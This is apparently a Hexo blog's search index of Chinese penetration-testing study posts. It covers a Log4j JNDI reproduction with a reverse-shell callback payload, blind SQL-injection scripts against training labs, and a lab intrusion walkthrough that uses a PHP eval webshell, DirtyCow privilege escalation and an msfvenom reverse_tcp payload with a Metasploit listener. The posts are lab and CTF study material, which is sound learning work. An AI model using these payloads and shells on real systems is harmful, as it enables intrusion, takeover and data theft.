<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>log4j复现</title>
    <link href="/2023/03/12/log4j%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/03/12/log4j%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="1-理解log4j漏洞的前置知识"><a href="#1-理解log4j漏洞的前置知识" class="headerlink" title="1.理解log4j漏洞的前置知识"></a>1.理解log4j漏洞的前置知识</h3><h4 id="1-JNDI接口"><a href="#1-JNDI接口" class="headerlink" title="1.JNDI接口"></a>1.JNDI接口</h4><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><p><strong>有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</strong></p><h4 id="2-LDAP协议"><a href="#2-LDAP协议" class="headerlink" title="2.LDAP协议"></a>2.LDAP协议</h4><p>LDAP称为轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。</p><p><strong>有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</strong></p><h4 id="3-RMI协议"><a href="#3-RMI协议" class="headerlink" title="3.RMI协议"></a>3.RMI协议</h4><p><strong>JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。</strong></p><h4 id="4-Log4j"><a href="#4-Log4j" class="headerlink" title="4.Log4j"></a>4.Log4j</h4><p>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。通过Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器等各种地方。</p><h3 id="2-Log4j漏洞的成因"><a href="#2-Log4j漏洞的成因" class="headerlink" title="2.Log4j漏洞的成因"></a>2.Log4j漏洞的成因</h3><p>Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。</p><p>由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI+LDAP或者JNDI+RMI通过命名功能直接从远程服务器上调用文件并在本地执行。</p><p>Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。</p><p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE。</p><h3 id="3-log4j漏洞复现"><a href="#3-log4j漏洞复现" class="headerlink" title="3.log4j漏洞复现"></a>3.log4j漏洞复现</h3><h4 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1.检测漏洞是否存在"></a>1.检测漏洞是否存在</h4><p>在线靶场 </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ctf.show/challenges#Log<span class="hljs-number">4</span>j<span class="hljs-variable">%E5</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%8</span>D<span class="hljs-variable">%E7</span><span class="hljs-variable">%8</span>E<span class="hljs-variable">%B0-1730</span><br></code></pre></td></tr></table></figure><p>payload配合dnslog检测漏洞是否存在</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//ntoand.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122204654.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122205977.png"></p><h4 id="2-进一步利用"><a href="#2-进一步利用" class="headerlink" title="2.进一步利用"></a>2.进一步利用</h4><p>在服务器上启动ladp服务</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122214917.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122221534.png"></p><p>监听开启</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122223114.png"></p><p>接下来进行payload构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldap:<span class="hljs-regexp">//</span>null:<span class="hljs-number">1389</span><span class="hljs-regexp">/Basic/</span>Command<span class="hljs-regexp">/Base64/</span>[base64_encoded_cmd]<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/yourip/</span><span class="hljs-number">1099</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>如</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$&#123;jndi:ldap://<span class="hljs-number">113.14</span>.<span class="hljs-number">5.159</span>:<span class="hljs-number">1389</span>/TomcatBypass/Command/Base<span class="hljs-number">64</span>/YmFzaCAtaSA<span class="hljs-variable">%2</span>bJiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">8</span>xMTMuMTQuNS<span class="hljs-number">4</span>xNTkvMjMzMyAwPiYxIA<span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d&#125;<br></code></pre></td></tr></table></figure><p>YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMTMuMTQuNS4xNTkvMjMzMyAwPiYxIA%3d%3d</p><h3 id="四、Log4j的临时缓解措施"><a href="#四、Log4j的临时缓解措施" class="headerlink" title="四、Log4j的临时缓解措施"></a>四、Log4j的临时缓解措施</h3><p>关闭lookup功能：</p><p>（1）设置log4j2.formatMsgNoLookups&#x3D;True</p><p>（2）Dlog4j2.formatMsgNoLookups&#x3D;true。</p><p>（3）设置系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS为true</p><p>（4）采用防火墙对请求流量中的${jndi进行拦截，防止JNDI注入。</p><p>（5）禁止存在漏洞的业务访问外网，主动外连外网。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习</title>
    <link href="/2022/11/18/python%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/18/python%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="python学习笔记"><a href="#python学习笔记" class="headerlink" title="python学习笔记"></a>python学习笔记</h1><h3 id="1-使用python脚本整合目录扫描字典"><a href="#1-使用python脚本整合目录扫描字典" class="headerlink" title="1.使用python脚本整合目录扫描字典"></a>1.使用python脚本整合目录扫描字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./2.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>) <span class="hljs-comment">#a+表示可读可写但是写入只能追加</span><br>lines = f.readlines()  <span class="hljs-comment"># 读取全部内容 ，并以列表方式返回</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./1.txt&quot;</span>):<br>   <span class="hljs-keyword">if</span> line <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> lines:<br>       f.writelines(line)<br>f.close()<br></code></pre></td></tr></table></figure><h3 id="2-burp靶场cookie-sql注入时间盲注脚本"><a href="#2-burp靶场cookie-sql注入时间盲注脚本" class="headerlink" title="2.burp靶场cookie-sql注入时间盲注脚本"></a>2.burp靶场cookie-sql注入时间盲注脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;https://0a03004a034fb137c4f82c9500f4000c.web-security-academy.net/&#x27;</span><br>a=<span class="hljs-string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>payload_1= <span class="hljs-string">&quot;&#x27;%3bselect+case+when+(username=&#x27;administrator&#x27;+and+SUBSTRING(password,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--&quot;</span><br>h=&#123;<br><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;0a03004a034fb137c4f82c9500f4000c.web-security-academy.net&quot;</span>,<br><span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;session=2mfZwsZHlmyYL2mwPlK0e34AEA021iz7;TrackingId=Y7quZz53LMWRIZbA&quot;</span><br>&#125;<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        payload=payload_1.<span class="hljs-built_in">format</span>(num,i)<br>        h[<span class="hljs-string">&quot;Cookie&quot;</span>]=<span class="hljs-string">&#x27;session=w3v9123vZW4IJxuNRuqJBOJ86sbLcmNb;TrackingId=i1NjLmRNA1lXR2pZ&#x27;</span>+payload<br>        res=requests.get(url,headers=h,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(res.reason) != <span class="hljs-string">&#x27;OK&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-sqli-简单盲注脚本"><a href="#3-sqli-简单盲注脚本" class="headerlink" title="3.sqli 简单盲注脚本"></a>3.sqli 简单盲注脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;and if(substring(user(),&#123;&#125;,1)=&quot;&#123;&#125;&quot;,1,0)--+&#x27;</span><br>url1=<span class="hljs-string">&quot;http://192.168.90.45/sql/Less-8/?id=1&#x27;&quot;</span><br>b=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> b:<br>        url=url1+payload.<span class="hljs-built_in">format</span>(i,c)<br>        res=requests.get(url=url)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            <span class="hljs-built_in">print</span>(c,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场三</title>
    <link href="/2022/11/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
    <url>/2022/11/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<p>文章参考</p><p><a href="https://blog.csdn.net/weixin_46684578/article/details/118685782">https://blog.csdn.net/weixin_46684578/article/details/118685782</a></p><p><a href="https://blog.csdn.net/weixin_48169878/article/details/125773366">https://blog.csdn.net/weixin_48169878/article/details/125773366</a></p><p><a href="https://cloud.tencent.com/developer/article/2016323">https://cloud.tencent.com/developer/article/2016323</a></p><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>添加一个自定义配置为</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181552631.png"></p><p>然后对出网机centos重新加载网卡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ect/i</span>nit.d/network restart<br></code></pre></td></tr></table></figure><p>搭建完成</p><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>本次靶场出网机为centos</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181554527.png"></p><p>直接进去获取IP得 192.168.123.41</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20221118155500729.png"></p><p>访问发现有80端口有服务</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181556155.png" style="zoom:50%;" /><p>直接上awvs扫描漏洞</p><p>同时用nmap进行端口扫描</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">123.41</span> -<span class="hljs-selector-tag">p</span>-<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181559838.png"></p><p>扫描出了5个端口分别为</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">22 </span><span class="hljs-number">25</span> <span class="hljs-number">80</span> <span class="hljs-number">110</span> <span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p>awvs扫描出了配置文件泄露，泄露了数据库的用户名和密码</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181601570.png" style="zoom:67%;" /><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">testuser<br>cvcvgjASD!@<br></code></pre></td></tr></table></figure><p>还顺便扫出了后台地址&#x2F;administrator&#x2F;</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181604394.png" alt="image-20221118160400347" style="zoom:67%;" /><p>找到了后台先试试看弱口令，爆破失败</p><p>那既然3306端口是开放的，又有账户和密码那直接上数据库添加用户</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181608520.png" style="zoom:67%;" /><p>使用数据库工具成功连接了数据库</p><p>找到了am2zu_users的表有一个管理员账号，但是是密文存储</p><p>通过上网查阅Joomla密码加密相关资料，发现密码是经过了password_hash($password, PASSWORD_BCRYPT);加密，并且未找到对应的解密方案</p><p>但是Joomla官方文档，上面有介绍到可以通过数据库直接插入来添加管理员账号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>docs.joomla.org<span class="hljs-operator">/</span>How_do_you_recover_or_reset_your_admin_password<span class="hljs-operator">%</span><span class="hljs-number">3</span>F<span class="hljs-operator">/</span>zh<span class="hljs-operator">-</span>cn<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>其中下面<span class="hljs-keyword">sql</span>语句中的jos31需要换成你实际的表前缀<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `jos31_users`<br>   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;Administrator2&#x27;</span>, <span class="hljs-string">&#x27;admin2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `jos31_user_usergroup_map` (`user_id`,`group_id`)<br><span class="hljs-keyword">VALUES</span> (LAST_INSERT_ID(),<span class="hljs-string">&#x27;8&#x27;</span>);<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>执行完这两条语句之后，我们就添加成功了一个管理员用户（账号：admin2，密码：secret）<br></code></pre></td></tr></table></figure><p>成功进入后台</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181614440.png"></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>进入网站模板</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181618079.png" alt="" style="zoom:67%;" /><p>创建文件，直接创建一个shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181619273.png"></p><p>创建成功</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181621923.png"></p><p>shell.php和index.php是同一路径，因此知道index.php的路径即可</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181624204.png"></p><p>猜测路径为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/templates/</span>beez3/shell.php<br></code></pre></td></tr></table></figure><p>成功连接</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181629786.png" style="zoom:80%;" /><p>尝试使用虚拟终端</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181631500.png"></p><p>查看一下PHPinfo,发现命令执行被禁用</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181633544.png"></p><p>怎么办呢，有两种方法</p><p><strong>第一种</strong></p><p>下载绕过disable_funtions 的payload</p><p><a href="https://github.com/MrAnonymous-1/disable_functions">https://github.com/MrAnonymous-1/disable_functions</a></p><p>将exploit1.php上传到web服务器的指定目录下</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181634525.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST: cmd=&lt;command&gt;<br><span class="hljs-regexp">//</span> &lt;command&gt;为要执行的系统命令<br><span class="hljs-regexp">//</span> 例如：cmd=ipconfig<br></code></pre></td></tr></table></figure><p><strong>第二种</strong></p><p>&#x2F;tmp&#x2F;mysql&#x2F;下发现一个test.txt文件</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181639887.png"></p><p>得到了账号密码直接连接ssh</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wwwuser</span><br>wwwuser_123Aqx<br></code></pre></td></tr></table></figure><p>登陆成功</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181644824.png" style="zoom:67%;" /><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>查看权限</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181645338.png"></p><p>发现权限太低只是一个普通用户</p><p>使用脏牛漏洞(CVE-2016-5195)进行提权</p><p>低于以下版本表示存在脏牛漏洞(CVE-2016-5195)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Centos7</span> /RHEL7    <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">327</span>.<span class="hljs-number">36</span>.<span class="hljs-number">3</span>.el7<br><span class="hljs-attribute">Cetnos6</span>/RHEL6     <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>-<span class="hljs-number">642</span>.<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.el6<br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">10</span>         <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">26</span>.<span class="hljs-number">28</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">04</span>         <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">45</span>.<span class="hljs-number">66</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">14</span>.<span class="hljs-number">04</span>         <span class="hljs-number">3</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">100</span>.<span class="hljs-number">147</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">8</span>                <span class="hljs-number">3</span>.<span class="hljs-number">16</span>.<span class="hljs-number">36</span>-<span class="hljs-number">1</span>+deb8u2<br><span class="hljs-attribute">Debian</span> <span class="hljs-number">7</span>                <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">82</span>-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211181647977.png"></p><p>[工具包]<a href="https://gitcode.net/mirrors/FireFart/dirtycow">https://gitcode.net/mirrors/FireFart/dirtycow</a></p><p> 然后下载藏牛工具包，这里我们有ssh可以直接利用ftp上传，如果没有的话也可以</p><p>上传到kali，开启http服务，靶机下载解压</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kail ： python3 -m http<span class="hljs-selector-class">.server</span> <span class="hljs-number">8000</span>     <br><br>靶机：wget http:<span class="hljs-comment">//192.168.1.123:800/dirtycow.github.io-master.zip</span><br><br>靶机：unzip dirtycow<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io-master</span><span class="hljs-selector-class">.zip</span> -d zangniu <br></code></pre></td></tr></table></figure><p>然后执行提权脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gcc -pthread dirty.c -o dirty -lcrypt  <span class="hljs-comment">#编译</span></span><br>​<br><span class="hljs-meta prompt_">#</span><span class="language-bash">./dirty   root      <span class="hljs-comment">#因为已经存在/tmp/passwd.bak 会失败</span></span><br>​<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">rm</span> -f /tmp/passwd.bak</span> <br>​<br><span class="hljs-meta prompt_">#</span><span class="language-bash">./dirty   root   <span class="hljs-comment">#root 为密码， ./dirty  密码</span></span><br></code></pre></td></tr></table></figure><p>执行结束之后创建了一个新用户firefart，密码为root，这个用户拥有root权限</p><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><p>通过icmp方式查看内网主机存活情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.&#123;<span class="hljs-number">1</span>..<span class="hljs-number">254</span>&#125;; do if ping -c <span class="hljs-number">3</span> -w <span class="hljs-number">3</span> $i &amp;&gt;/dev/null; then echo $i is alived; fi; done<br></code></pre></td></tr></table></figure><p>使用msf建立监听</p><p><strong>方法1</strong></p><p>在msf上生成<a href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a>传到目标机器执行上线</p><p>生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.169.80.128 <span class="hljs-attribute">LPORT</span>=6666 <span class="hljs-attribute">SessionCommunicationTimeout</span>=0 <span class="hljs-attribute">SessionExpirationTimeout</span>=0 -f elf &gt; shell.elf<br><br></code></pre></td></tr></table></figure><p>然后用ssh上传到centos</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211211559648.png"></p><p>然后在msf开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/multi/handler <br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lhost &lt;MSF_IP&gt;<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport &lt;MSF_Port&gt;<br>msf6 exploit(multi/handler) &gt; exploit <br></code></pre></td></tr></table></figure><p>开启监听之后 在centos执行shell.elf即可建立监听</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211211608400.png"></p><p><strong>方法2</strong></p><p>一条命令上线</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红日靶场</tag>
      
      <tag>渗透</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite靶场sql注入</title>
    <link href="/2022/11/16/burpsuite%E9%9D%B6%E5%9C%BAsql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/11/16/burpsuite%E9%9D%B6%E5%9C%BAsql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162245670.png"></p><hr><p>工具准备（hackerbar）<a href="https://chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc">https://chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc</a></p><hr><h3 id="1-WHERE-子句中的-SQL-注入漏洞，允许检索隐藏数据"><a href="#1-WHERE-子句中的-SQL-注入漏洞，允许检索隐藏数据" class="headerlink" title="1.WHERE 子句中的 SQL 注入漏洞，允许检索隐藏数据"></a>1.WHERE 子句中的 SQL 注入漏洞，允许检索隐藏数据</h3><p>点击类别pets筛选</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162241768.png"></p><p>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>ategory=Pets<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>输入后发现没有进行筛选</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162242491.png"></p><p>所以这是where语句造成的sql注入</p><p>实验完成</p><hr><h3 